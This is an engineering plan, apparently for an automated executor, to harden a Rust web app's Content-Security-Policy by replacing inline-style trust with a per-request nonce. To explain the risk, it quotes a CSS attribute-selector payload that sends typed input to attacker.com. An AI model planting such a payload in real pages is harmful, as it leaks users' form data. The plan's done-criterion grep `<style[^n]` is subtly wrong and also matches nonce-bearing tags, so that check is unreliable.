# Plan 029: Remove style-src 'unsafe-inline' — extend nonce to inline styles

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md`.
>
> **Drift check (run first)**: `git diff --stat 0819727..HEAD -- src/http/security_headers.rs src/views/`
> If any in-scope file changed, compare the "Current state" excerpts against
> the live code; on a mismatch treat it as a STOP condition.

## Status

- **Priority**: P2
- **Effort**: M
- **Risk**: MED
- **Depends on**: plans/028-security-headers-hardening.md
- **Category**: security
- **Planned at**: commit `0819727`, 2026-06-26

## Why this matters

The current CSP contains `style-src 'self' 'unsafe-inline'`. This means any `<style>` tag that appears in a rendered page — from a template, a custom theme, or future feature code — is automatically trusted by the browser. A CSS injection attack (e.g., attribute-selector oracle `input[value^="x"] { background-image: url(attacker.com/?c=x) }`) becomes possible if user-controlled content ever reaches a `<style>` context. Ammonia sanitizes user Markdown but does not prevent style injection from template-level code.

The nonce mechanism for `script-src` is already wired (`CspNonce` generated per-request, injected as an Axum extension, used in `<script nonce="…">` tags). Extending it to `style-src` means inline `<style>` blocks must carry the same per-request nonce or they are blocked by the browser — a second line of defence after Ammonia.

## Current state

**`src/http/security_headers.rs`** — CSP format string (after plan 028 lands):
```
style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'
```

**`src/http/security_headers.rs:13–23`** — `CspNonce` struct:
```rust
pub struct CspNonce(String);

impl CspNonce {
    pub fn generate() -> Self {
        Self(Uuid::new_v4().simple().to_string())
    }
    pub fn as_str(&self) -> &str { &self.0 }
}
```
The nonce is inserted into request extensions at `request.extensions_mut().insert(nonce.clone())` and retrieved by view templates via `Extension::<CspNonce>`.

**`src/views/`** — HTML templates are Rust string formatting functions (no Askama/Tera). Search for `<style` in `src/views/` to find every inline style tag. Each one must gain a `nonce="…"` attribute.

**Convention** for templates: `src/views/layout.rs` is the shared layout entry. Any `<style>` tag in the layout affects every HTML page. Match the pattern used by `<script nonce="…">` tags.

## Commands you will need

| Purpose    | Command                                              | Expected on success          |
|------------|------------------------------------------------------|------------------------------|
| Find style tags | `grep -rn '<style' src/views/`               | list of files + line numbers |
| Typecheck  | `cargo check --all-targets`                          | exit 0                       |
| Tests      | `cargo nextest run --test security_headers_contract` | all pass                     |
| All tests  | `cargo nextest run`                                  | all pass                     |
| Lint       | `cargo clippy --all-targets -- -D warnings`          | exit 0                       |

## Scope

**In scope**:
- `src/http/security_headers.rs` — change `style-src 'self' 'unsafe-inline'` to `style-src 'self' 'nonce-{nonce}'`
- Every file in `src/views/` that emits a `<style>` tag — add `nonce="{nonce}"` attribute to each
- `tests/security_headers_contract.rs` — update CSP assertion for style-src

**Out of scope**:
- `src/rendering/` — Ammonia sanitizer strips `style` attributes from user Markdown; no change needed
- `<link rel="stylesheet">` tags — those reference external files and do not need a nonce; `style-src 'self'` covers them
- The `INKWELL_CUSTOM_CSS_URL` link tag — it is a stylesheet link, not an inline block; no nonce needed

## Git workflow

- Branch: `advisor/029-csp-style-nonce`
- Commit: `fix(http): extend CSP nonce to style-src, remove unsafe-inline`

## Steps

### Step 1: Find all inline `<style>` tags in src/views/

Run: `grep -rn '<style' src/views/`

List every file and line number. If there are zero results, the plan is trivially done — skip to Step 3 and just change the CSP string.

If there are results, proceed to Step 2 for each file found.

**Verify**: You have a complete list.

### Step 2: Add nonce to each `<style>` tag

For each `<style>` occurrence in `src/views/`, change:
```html
<style>
```
to:
```html
<style nonce="{nonce}">
```
where `{nonce}` is the value of `CspNonce` already available in the request extension.

The nonce is already passed to views that need it (look for `CspNonce` parameter in the view function signatures). If a view does not currently receive the nonce, add it following the same pattern used by view functions that already receive it (look for `nonce: &CspNonce` or `nonce: &str` parameters in `src/views/layout.rs`).

STOP condition: If a view has a `<style>` tag but the rendering function has no mechanism to receive the nonce and adding it requires touching more than 3 files. Report and stop.

**Verify**: `grep -rn '<style' src/views/` shows all remaining `<style>` tags have a `nonce=` attribute.

### Step 3: Update CSP style-src directive

In `src/http/security_headers.rs`, change the CSP format string:

```rust
// Before (after plan 028):
"... style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}' ..."

// After:
"... style-src 'self' 'nonce-{nonce}'; script-src 'self' 'nonce-{nonce}' ..."
```

Note: the same nonce value appears for both `style-src` and `script-src`.

**Verify**: `cargo check --all-targets` → exit 0

### Step 4: Update tests

In `tests/security_headers_contract.rs`, update any assertion that checks for `'unsafe-inline'` in `style-src` — it should now check for `'nonce-` instead. Add a test that loads a page HTML response and asserts `<style nonce="…">` is present (if there are any inline styles).

**Verify**: `cargo nextest run --test security_headers_contract` → all pass

## Test plan

- Existing CSP tests updated: `style-src` no longer contains `'unsafe-inline'`, contains `'nonce-'`.
- Integration test: `GET /` returns HTML where all `<style>` tags have a `nonce` attribute matching the `Content-Security-Policy` response header's nonce.

## Done criteria

- [ ] `cargo check --all-targets` exits 0
- [ ] `cargo clippy --all-targets -- -D warnings` exits 0
- [ ] `cargo fmt --check` exits 0
- [ ] `cargo nextest run` exits 0; CSP style-src nonce test passes
- [ ] `grep -rn "'unsafe-inline'" src/http/security_headers.rs` returns no matches
- [ ] `grep -rn '<style[^n]' src/views/` returns no matches (all style tags have nonce)
- [ ] `plans/README.md` status row updated

## STOP conditions

- A view renders `<style>` but has no path to receive the `CspNonce` extension without touching more than 3 files.
- After removing `'unsafe-inline'`, a page's styles break visually (the nonce doesn't reach a tag).
- `cargo check` fails after the CSP string change.

## Maintenance notes

- Every new `<style>` tag added to `src/views/` in the future must include `nonce="{nonce}"` — the verify checklist in `context/conventions.md` should be updated to include this rule.
- The custom CSS URL (`INKWELL_CUSTOM_CSS_URL`) is a `<link>` element and requires no nonce — `style-src 'self'` covers external stylesheets from the same origin, and external URLs are covered by `style-src 'self' 'nonce-…'` only if you also add the external host — this is intentionally not done; third-party CSS should not be auto-trusted.
